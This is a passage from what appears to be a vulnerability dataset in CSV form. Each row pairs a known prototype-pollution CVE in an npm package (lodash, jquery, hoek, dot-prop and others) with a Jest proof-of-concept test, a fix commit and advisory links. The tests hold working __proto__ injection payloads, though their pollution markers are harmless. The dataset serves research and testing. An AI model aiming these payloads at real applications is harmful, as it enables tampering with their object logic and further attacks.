  y18n.updateLocale({ polluted: ""yes"" }); //payload

  expect({}.polluted).toBe(""yes"");
});
",,index.js:156:34,https://security.snyk.io/vuln/SNYK-JS-Y18N-1021887; https://github.com/advisories/GHSA-c4w7-xm78-47vh
prototype-pollution,CVE-2021-23402,record-like-deep-assign,1.0.1,,prototype-pollution/record-like-deep-assign_1.0.1,"//https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024
test(""prototype pollution in x-assign"", () => {
  const deepAssign = require(""record-like-deep-assign"");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  deepAssign({}, EVIL_JSON);

  expect({}.polluted).toBe(""yes"");
});
",,src/mod.ts:34:9,https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024; https://github.com/advisories/GHSA-7qm6-9v49-38m9
prototype-pollution,CVE-2021-23820,json-pointer,0.6.1,,prototype-pollution/json-pointer_0.6.1,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
test(""prototype pollution in json-pointer"", () => {
  const pointer = require(""json-pointer"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pointer.set({}, [[""__proto__""], ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,index.js:98:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577287; https://github.com/advisories/GHSA-v5vg-g7rq-363w
prototype-pollution,CVE-2020-7720,node-forge,0.9.0,0.10.0,prototype-pollution/node-forge_0.9.0,"//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
test(""prototype pollution in node-forge"", () => {
  expect({}.polluted).toBe(undefined);

  const nodeforge = require(""node-forge"");
  const obj = {};
  nodeforge.util.setPath(obj, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/digitalbazaar/forge/commit/51228083550dde97701ac8e06c629a5184117562,lib/util.js:2536:22,https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-598677; https://github.com/advisories/GHSA-92xj-mqp7-vmcj
prototype-pollution,,lutils-merge,0.2.6,,prototype-pollution/lutils-merge_0.2.6,"//https://hackerone.com/reports/439107
test(""prototype pollution in lutils-merge"", () => {
  const merge = require(""lutils-merge"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",,merge.js:156:23,https://security.snyk.io/vuln/SNYK-JS-LUTILSMERGE-174783; https://github.com/advisories/GHSA-f7qw-5pvg-mmwp
prototype-pollution, CVE-2021-25953,putil-merge,3.0.0,3.7.0,prototype-pollution/putil-merge_3.0.0,"//https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077
test(""prototype pollution in putil-merge"", () => {
  const putil_merge = require(""putil-merge"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  var obj = {};

  expect({}.polluted).toBe(undefined);

  putil_merge(obj, payload, { deep: true });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/panates/putil-merge/commit/a8f5087faaa034cc2dc2e8070c13014ad6a34043,lib/merge.js:72:19,https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077; https://github.com/advisories/GHSA-9x7m-9hpg-xxmw
prototype-pollution,CVE-2020-7713,arr-flatten-unflatten,1.1.4,,prototype-pollution/arr-flatten-unflatten_1.1.4,"//https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396
test(""prototype pollution in arr-flatten-unflatten"", () => {
  expect({}.polluted).toBe(undefined);

  const { unflatten } = require(""arr-flatten-unflatten"");
  unflatten({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",,unflatten.js:17:16,https://security.snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396; https://github.com/advisories/GHSA-w8f3-pvx4-4c3h
prototype-pollution,CVE-2019-11358,jquery,1.11.0, 3.4.0,prototype-pollution/jquery_1.11.0,"//https://hackerone.com/reports/454365
test(""prototype pollution in jquery"", () => {
  const { JSDOM } = require(""jsdom"");
  const { window } = new JSDOM("""");
  const $ = require(""jquery"")(window);

  obj = {};

  expect({}.polluted).toBe(undefined);

  $.extend(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b,dist/jquery.js:230:21,https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006; https://github.com/advisories/GHSA-6c3j-c64m-qhgq
prototype-pollution,CVE-2020-7702,Templ8,0.7.0,,prototype-pollution/Templ8_0.7.0,"//https://snyk.io/vuln/SNYK-JS-TEMPL8-598770
test(""prototype pollution in Templ8"", () => {
  expect({}.polluted).toBe(undefined);

  const Templ8 = require(""Templ8"");
  const tpl = new Templ8('{{__proto__.polluted=""yes""}}');
  tpl.parse();

  try {
    expect(polluted).toBe(""yes"");
  } catch {
    expect(false).toBe(true);
  }
});
",,,https://security.snyk.io/vuln/SNYK-JS-TEMPL8-598770; https://github.com/advisories/GHSA-c7m7-4257-h698
prototype-pollution,CVE-2020-28461,js-ini,1.2.0,1.3.0,prototype-pollution/js-ini_1.2.0,"//https://snyk.io/vuln/SNYK-JS-JSINI-1048970
test(""prototype pollution in js-ini"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ini = require(""js-ini"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  ini.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.ini""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/Sdju/js-ini/commit/fa17efb7e3a7c9464508a254838d4c231784931e,src/parse.ts:68:58,https://security.snyk.io/vuln/SNYK-JS-JSINI-1048970; 
prototype-pollution,CVE-2021-23426,Proto,1.1.4,,prototype-pollution/Proto_1.1.4,"//https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301
test(""prototype pollution in Proto"", () => {
  const proto = require(""Proto"");
  let payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  proto.merge({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",,,https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301; https://github.com/advisories/GHSA-58g2-9fqr-36q2
prototype-pollution,,@uifabric/utilities,7.20.2,7.20.3,prototype-pollution/uifabric-utilities_7.20.2,"//https://snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487
test(""prototype pollution in @uifabric/utilities "", () => {
  const util = require(""@uifabric/utilities"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  const source2 = {
    k3: {},
  };

  expect({}.polluted).toBe(undefined);

  y = util.merge(source2, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,utilities/src/merge.ts:33:21,https://security.snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487; 
prototype-pollution,CVE-2021-23820,json-pointer,0.6.0,,prototype-pollution/json-pointer_0.6.0,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
test(""prototype pollution in json-pointer"", () => {
  const pointer = require(""json-pointer"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pointer.set(obj, ""/__proto__/polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/manuelstofer/json-pointer/pull/34/files,index.js:91:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925; https://github.com/advisories/GHSA-v5vg-g7rq-363w
prototype-pollution,CVE-2018-3728,hoek,5.0.0,5.0.3,prototype-pollution/hoek_5.0.0,"//https://snyk.io/vuln/npm:hoek:20180212
test(""prototype pollution in hoek"", () => {
  const Hoek = require(""hoek"");
  obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  Hoek.merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/hapijs/hoek/commit/32ed5c9413321fbc37da5ca81a7cbab693786dee,lib/index.js:137:29,https://security.snyk.io/vuln/npm:hoek:20180212; https://github.com/advisories/GHSA-jp4x-w63m-7wgm
prototype-pollution,CVE-2020-28267,@strikeentco/set,1.0.0,1.0.1,prototype-pollution/strikeentco-set_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267
test(""prototype pollution in strikeentco/set "", () => {
  const sset = require(""@strikeentco/set"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  sset(obj, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/strikeentco/set/commit/102cc6b2e1d1e0c928ced87e75df759d5541ff60,set/main.js:11:17,https://security.snyk.io/vuln/SNYK-JS-STRIKEENTCOSET-1038821; 
prototype-pollution,CVE-2021-25927,safe-flat,2.0.0,2.0.2,prototype-pollution/safe-flat_2.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
test(""prototype pollution in safeFlat"", () => {
  var safeFlat = require(""safe-flat"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safeFlat.unflatten({ ""__proto__.polluted"": ""yes"" }, "".""); //payload
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,src/index.js:48:30,https://security.snyk.io/vuln/SNYK-JS-SAFEFLAT-1277112; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
prototype-pollution,CVE-2020-8116,dot-prop,2.0.0,5.1.1,prototype-pollution/dot-prop_2.0.0,"//https://snyk.io/test/npm/dot-prop/2.0.0
test(""prototype pollution in dot-prop"", () => {
  expect({}.polluted).toBe(undefined);

  const dotProp = require(""dot-prop"");
  dotProp.set({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/sindresorhus/dot-prop/commit/3039c8c07f6fdaa8b595ec869ae0895686a7a0f2,index.js:32:14,https://security.snyk.io/vuln/SNYK-JS-DOTPROP-543489; https://github.com/advisories/GHSA-ff7x-qrg7-qggm
prototype-pollution,CVE-2021-25941,deep-override,1.0.0,1.0.2,prototype-pollution/deep-override_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25941
test(""prototype pollution in deep-override"", () => {
  expect({}.polluted).toBe(undefined);

  const deepOverride = require(""deep-override"");
  deepOverride({}, JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}'));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/ASaiAnudeep/deep-override/commit/2aced17651fb684959a6e04b1465a8329b3d5268,src/index.js:53:23,https://security.snyk.io/vuln/SNYK-JS-DEEPOVERRIDE-1292344; https://github.com/advisories/GHSA-v659-54cx-g4qr
prototype-pollution,CVE-2021-23417,deepmergefn,1.1.0,,prototype-pollution/deepmergefn_1.1.0,"//https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984
test(""prototype pollution in deepmergefn"", () => {
  const deepMerge = require(""deepmergefn"");

  expect({}.polluted).toBe(undefined);

  EVIL_DATA = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  deepMerge({}, EVIL_DATA);

  expect({}.polluted).toBe(""yes"");
});
",,index.js:12:30,https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984; https://github.com/advisories/GHSA-vj72-mwrj-m2xq
prototype-pollution,CVE-2021-3766,objection,2.0.0,3.0.0-alpha.5,prototype-pollution/objection_2.0.0,"//https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910
test(""prototype pollution in objection"", () => {
  const objectUtils = require(""objection/lib/utils/objectUtils"");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  objectUtils.set(obj, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/vincit/objection.js/commit/b41aab8dcd78f426f7468dcda541a7aca18a66a6,lib/utils/objectUtils.js:246:32,https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910; https://github.com/advisories/GHSA-r659-8xfp-j327
prototype-pollution,CVE-2020-8268,json8-merge-patch,1.0.1,1.0.3,prototype-pollution/json8-merge-patch_1.0.1,"//https://hackerone.com/reports/980649
test(""prototype pollution in json8-merge-patch"", () => {
  expect({}.polluted).toBe(undefined);

  const json8mergepatch = require(""json8-merge-patch"");
  json8mergepatch.apply(
    {},
    JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}')
  );

  expect({}.polluted).toBe(""yes"");
});
",,lib/apply.js:25:12,https://security.snyk.io/vuln/SNYK-JS-JSON8MERGEPATCH-1038399; https://github.com/advisories/GHSA-8v9x-9xqg-r8mr
prototype-pollution,CVE-2020-7725,worksmith,1.0.0,,prototype-pollution/worksmith_1.0.0,"//https://snyk.io/vuln/SNYK-JS-WORKSMITH-598798

test(""prototype pollution in worksmith"", () => {
  const worksmith = require(""worksmith"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  worksmith.setValue({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,index.js:300:30,https://security.snyk.io/vuln/SNYK-JS-WORKSMITH-598798; https://github.com/advisories/GHSA-9829-jj5p-j6hf
prototype-pollution,CVE-2019-10794,component-flatten,1.0.1,,prototype-pollution/component-flatten_1.0.1,"//snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907
https: test(""prototype pollution in component-flatten"", () => {
  expect({}.polluted).toBe(undefined);

  const cf = require(""component-flatten"");
  let tree = { ref: ""polluted"", name: ""__proto__"" };
  cf(tree);

  expect({}.polluted).not.toBe(undefined);
});
",,index.js:56:26,https://security.snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907; 
prototype-pollution,,upmerge,0.1.7,0.1.8,prototype-pollution/upmerge_0.1.7,"//https://snyk.io/vuln/SNYK-JS-UPMERGE-174133
test(""prototype pollution in upmerge"", () => {
  let upmerge = require(""upmerge""); // this version is vulnerable
  let payload = '{""__proto__"":{ ""polluted"" : ""yes"" } }'; // this comes from network
  obj = {};

  expect({}.polluted).toBe(undefined);
  upmerge.merge({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",,build/upmerge.js:1:1247,https://security.snyk.io/vuln/SNYK-JS-UPMERGE-174133; https://github.com/advisories/GHSA-gm9g-2g8v-fvxj
prototype-pollution,CVE-2019-10792,bodymen,1.0.0,1.1.1,prototype-pollution/bodymen_1.0.0,"//https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b

test(""prototype pollution in bodymen "", () => {
  const x = require(""bodymen"");
  //a.handler(""__proto__"",""polluted"",""yes"");
  expect({}.polluted).toBe(undefined);

  x.handler(""__proto__"", ""polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b,dist/index.js:44:26,https://security.snyk.io/vuln/SNYK-JS-BODYMEN-548897; https://github.com/advisories/GHSA-8h84-8j4f-p97q
prototype-pollution,CVE-2021-23370,swiper,6.5.0,6.5.1,prototype-pollution/swiper_6.5.0,"//https://snyk.io/vuln/SNYK-JS-SWIPER-1088062
test(""prototype pollution in swiper"", () => {
  var swiper = require(""swiper"");
  let obj = {};
  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  swiper.default.extendDefaults(JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/nolimits4web/swiper/commit/9dad2739b7474f383474773d5ab898a0c29ac178,cjs/utils/utils.js:110:25,https://security.snyk.io/vuln/SNYK-JS-SWIPER-1088062; https://github.com/advisories/GHSA-p3hc-fv2j-rp68
prototype-pollution,CVE-2021-25944,deep-defaults,1.0.5,,prototype-pollution/deep-defaults_1.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944
test(""prototype pollution in dot-object "", () => {
  var deepDefaults = require(""deep-defaults"");
  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  var obj = {};

  expect({}.polluted).toBe(undefined);

  deepDefaults(obj, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:16:21,https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944; 
prototype-pollution,,smart-extend,1.7.3,,prototype-pollution/smart-extend_1.7.3,"//https://hackerone.com/reports/438274

test(""prototype pollution in smart-extend"", () => {
  var extend = require(""smart-extend"");
  obj = {};

  expect({}.polluted).toBe(undefined);
  var payload = '{""__proto__"":{""polluted"":""yes""}}';

  extend.deep({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",,dist/smart-extend.js:1:2739,https://security.snyk.io/vuln/SNYK-JS-SMARTEXTEND-174739; https://github.com/advisories/GHSA-f8h3-rqrm-47v9
prototype-pollution,CVE-2021-25916,patchmerge,1.0.0,1.0.2,prototype-pollution/patchmerge_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
test(""prototype pollution in patchmerge"", () => {
  const patchMerge = require(""patchmerge"");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  patchMerge(obj, JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}'));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/pjshumphreys/patchmerge/commit/5b383c537eae7a00ebd26d3f7211dac99ddecb12,index.js:93:24,https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585; https://github.com/advisories/GHSA-84g3-cv89-m9gm
prototype-pollution,,node-ini,1.0.0,,prototype-pollution/node-ini_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-NODEINI-1054844
test(""prototype pollution in node-ini"", () => {
  const ini = require(""node-ini"");

  expect({}.polluted).toBe(undefined);

  ini.parse(""./payload.ini"", function (err, data) {
    expect({}.polluted).toBe(""yes"");
  });
});
",,node-ini.js:25:66,https://security.snyk.io/vuln/SNYK-JS-NODEINI-1054844; 
prototype-pollution,CVE-2020-28268,controlled-merge,1.0.0,1.3.0,prototype-pollution/controlled-merge_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28268
test(""prototype pollution in controlled-merge "", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""controlled-merge"");
  const obj = merge(
    {},
    JSON.parse(
      '{ ""testProperty"": ""hi"", ""prototype"" : { ""polluted"" : ""yes"" } }'
    ),
    true
  );

  expect(obj.prototype.polluted).toBe(""yes"");
});
",https://github.com/hlfshell/controlled-merge/commit/5a4b2e9ffe5a0be7f8843d4ab038599d3ae5f9d4,,https://security.snyk.io/vuln/SNYK-JS-CONTROLLEDMERGE-1040460; https://github.com/advisories/GHSA-5pg7-v24c-9rp9
prototype-pollution,CVE-2019-10750,deeply,3.0.0,3.1.0,prototype-pollution/deeply_3.0.0,"//https://snyk.io/vuln/SNYK-JS-DEEPLY-451026
test(""prototype pollution in deeply "", () => {
  const mergeFn = require(""deeply"");
  const payload = '{""__proto__"": {""polluted"": ""yes""}}';
  var obj = {};

  expect({}.polluted).toBe(undefined);

  mergeFn({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/alexindigo/deeply/commit/6eccb2f03ec8d3eefc6805053c4cc2a36aab1505,lib/reduce_object.js:19:14,https://security.snyk.io/vuln/SNYK-JS-DEEPLY-451026; https://github.com/advisories/GHSA-8j4w-5fw4-rm27
prototype-pollution,CVE-2019-10795,undefsafe,2.0.2,2.0.3,prototype-pollution/undefsafe_2.0.2,"//https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940
test(""prototype pollution in undefsafe "", () => {
  expect({}.polluted).toBe(undefined);

  const a = require(""undefsafe"");
  const obj = {};
  const payload = ""__proto__.polluted"";
  a({}, payload, ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822,lib/undefsafe.js:106:17,https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940; 
prototype-pollution,CVE-2020-7639,eivindfjeldstad-dot,0.0.1,,prototype-pollution/eivindfjeldstad-dot_0.0.1,"//https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434
test(""prototype pollution in eivindfjeldstad-dot"", () => {
  const a = require(""eivindfjeldstad-dot"");

  expect({}.polluted).toBe(undefined);

  let path = ""__proto__.polluted"";
  a.set({}, path, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,index.js:20:13,https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434; 
prototype-pollution,CVE-2020-7715,deep-get-set,1.1.0,,prototype-pollution/deep-get-set_1.1.0,"test(""prototype pollution in deep-get-set"", () => {
  const deep = require(""deep-get-set"");

  expect({}.polluted).toBe(undefined);

  deep({}, [new String(""__proto__""), ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",,index.js:30:16,https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666; https://github.com/advisories/GHSA-85cp-p426-42f5
prototype-pollution,,getsetdeep,4.15.0,,prototype-pollution/getsetdeep_4.15.0,"test(""prototype pollution in getsetdeep"", () => {
  const pkg = require(""getsetdeep"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pkg.setDeep(obj, ""__proto__.polluted"", ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",,edition-esnext/index.js:74:17,https://github.com/advisories/GHSA-8j49-49jq-vwcq; 
prototype-pollution,CVE-2018-3721 ,lodash,4.17.15,4.17.5,prototype-pollution/lodash_4.17.15,"//https://security.snyk.io/vuln/SNYK-JS-LODASH-608086
test(""prototype pollution in lodash"", () => {
  const lod = require(""lodash"");
  let obj = {};
  expect({}.polluted).toBe(undefined);
  lod.set(obj, ""__proto__[polluted]"", ""yes"");
  expect({}.polluted).toBe(""yes"");
  delete obj.__proto__.polluted; // deletes the property set by this pollution
});

test(""prototype pollution in lodash"", () => {
  const lod = require(""lodash"");
  expect({}.polluted).toBe(undefined);
  lod.setWith({}, ""__proto__[polluted]"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,lodash.js:2559:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-608086; https://github.com/advisories/GHSA-fvqr-27wr-82fm
prototype-pollution,CVE-2021-25916,patchmerge,1.0.1,1.0.2,prototype-pollution/patchmerge_1.0.1,"//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
test(""prototype pollution in patchMerge"", () => {
  var patchMerge = require(""patchmerge"");
  var obj = {};
  expect({}.polluted).toBe(undefined);
  patchMerge(obj, JSON.parse('{""__proto__"": { ""polluted"": ""yes"" }}'));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/pjshumphreys/patchmerge/commit/5b383c537eae7a00ebd26d3f7211dac99ddecb12,index.js:93:24,https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585; https://github.com/advisories/GHSA-84g3-cv89-m9gm
prototype-pollution,CVE-2020-7638,confinit,0.3.0,0.4.0,prototype-pollution/confinit_0.3.0,"//https://snyk.io/vuln/SNYK-JS-CONFINIT-564433
test(""prototype pollution in confinit"", () => {
  const root = require(""confinit"");
  const payload = ""__proto__.polluted"";

  expect({}.polluted).toBe(undefined);

  root.setDeepProperty({}, payload, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/davideicardi/confinit/commit/a34e06ca5c1c8b047ef112ef188b2fe30d2a1eab,index.ts:112:15,https://security.snyk.io/vuln/SNYK-JS-CONFINIT-564433; https://github.com/advisories/GHSA-jgpq-g82g-6c39
prototype-pollution,CVE-2020-7704,linux-cmdline,1.0.0,1.0.1,prototype-pollution/linux-cmdline_1.0.0,"//https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674
test(""prototype pollution in linux-cmdline"", () => {
  expect({}.polluted).toBe(undefined);

  const linuxCmdline = require(""linux-cmdline"");
  linuxCmdline(""__proto__.polluted=yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/piranna/linux-cmdline/commit/53c61a88bc47eb25d71832205056beaab95cf677,index.js:48:15,https://security.snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674; 
prototype-pollution,CVE-2021-25948,expand-hash,1.0.1,,prototype-pollution/expand-hash_1.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
test(""prototype pollution in expand-hash "", () => {
  var expandHash = require(""expand-hash"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  expandHash({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-EXPANDHASH-1303101; https://github.com/advisories/GHSA-x3wr-v4wx-5qpc
prototype-pollution,CVE-2020-7637,class-transformer,0.1.1,0.3.1,prototype-pollution/class-transformer_0.1.1,"//https://snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431
test(""prototype pollution in class-transformer"", () => {
  expect({}.polluted).toBe(undefined);

  const root = require(""class-transformer"");
  const payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
  root.classToPlainFromExist(payload, {});

  expect({}.polluted).toBe(""yes"");
});
",,TransformOperationExecutor.ts:163:46,https://security.snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431; https://github.com/advisories/GHSA-6gp3-h3jj-prx4
prototype-pollution,CVE-2021-23328,iniparserjs,1.0.4,,prototype-pollution/iniparserjs_1.0.4,"//https://security.snyk.io/vuln/SNYK-JS-INIPARSERJS-1065989
test(""prototype pollution in iniparserjs"", () => {
  expect({}.polluted).toBe(undefined);

  var path = require(""path"");
  var IniParser = require(""iniparserjs"");

  var config = new IniParser(path.join(__dirname, ""test.ini""), ""UTF8"");
  // var sections = config.sections()
  // var keysOfSection1 = config.keysOfSection(""section1"")
  console.log(""After:"", {}.polluted);

  expect({}.polluted).toBe(""yes"");
});
",,ini_parser.js:63:50,https://security.snyk.io/vuln/SNYK-JS-INIPARSERJS-1065989; https://github.com/advisories/GHSA-2f6g-w5gj-c93h
prototype-pollution,CVE-2020-28282,getobject,0.1.0,1.0.0,prototype-pollution/getobject_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28282
test(""prototype pollution in getobject"", () => {
  expect({}.polluted).toBe(undefined);

  const getObject = require(""getobject"");
  var obj = {};
  console.log(""Before  : "" + obj.polluted);
  getObject.set(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,lib/getobject.js:48:23,https://security.snyk.io/vuln/SNYK-JS-GETOBJECT-1054932; https://github.com/advisories/GHSA-957j-59c2-j692
prototype-pollution,CVE-2019-10798,rdf-graph-array,0.3.0,,prototype-pollution/rdf-graph-array_0.3.0,"//https://snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803
test(""prototype pollution in rdf-graph-array"", () => {
  const Graph = require(""rdf-graph-array"").Graph;
  let g = new Graph();

  expect({}.polluted).toBe(undefined);

  g.add({
    graph: ""foo"",
    subject: ""__proto__"",
    predicate: ""polluted"",
    object: ""JHU"",
  });

  expect({}.polluted).not.toBe(undefined);
});
",,index.js:208:29,https://security.snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803; https://github.com/advisories/GHSA-prv2-xwr7-hr57
prototype-pollution,CVE-2020-28277,dset,1.0.0,2.1.0,prototype-pollution/dset_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28277
test(""prototype pollution in dset"", () => {
  expect({}.polluted).toBe(undefined);

  const dset = require(""dset"");
  dset({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",,dist/dset.js:6:18,https://security.snyk.io/vuln/SNYK-JS-DSET-1054939; 
prototype-pollution,CVE-2021-23396,lutils,2.4.0,,prototype-pollution/lutils_2.4.0,"//https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023
test(""prototype pollution in lutils"", () => {
  const lt = require(""lutils"");
  let obj = {};
  expect({}.polluted).toBe(undefined);

  let EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  lt.merge({}, EVIL_JSON);

  expect({}.polluted).toBe(""yes"");
});
",,merge/merge.ts:114:18,https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023; https://github.com/advisories/GHSA-3r8w-mphv-2f3f
prototype-pollution,CVE-2018-3752,merge-options,1.0.0,1.0.1,prototype-pollution/merge-options_1.0.0,"//https://snyk.io/vuln/npm:merge-options:20180415
test(""prototype pollution in merge-options"", () => {
  const merge = require(""merge-options"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/schnittstabil/merge-options/commit/d4a93bc2890455e0931ac0779667023e6cb101d4,index.js:73:16,https://security.snyk.io/vuln/npm:merge-options:20180415; https://github.com/advisories/GHSA-qw93-45r3-p66p
prototype-pollution,CVE-2020-7748,@tsed/core,5.62.3,5.65.7,prototype-pollution/tsed-core_5.62.3,"//https://snyk.io/vuln/SNYK-JS-TSEDCORE-1019382
test(""prototype pollution in @tsed/core"", () => {
  const { deepExtends } = require(""@tsed/core"");

  const payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  let obj = {};

  expect({}.polluted).toBe(undefined);

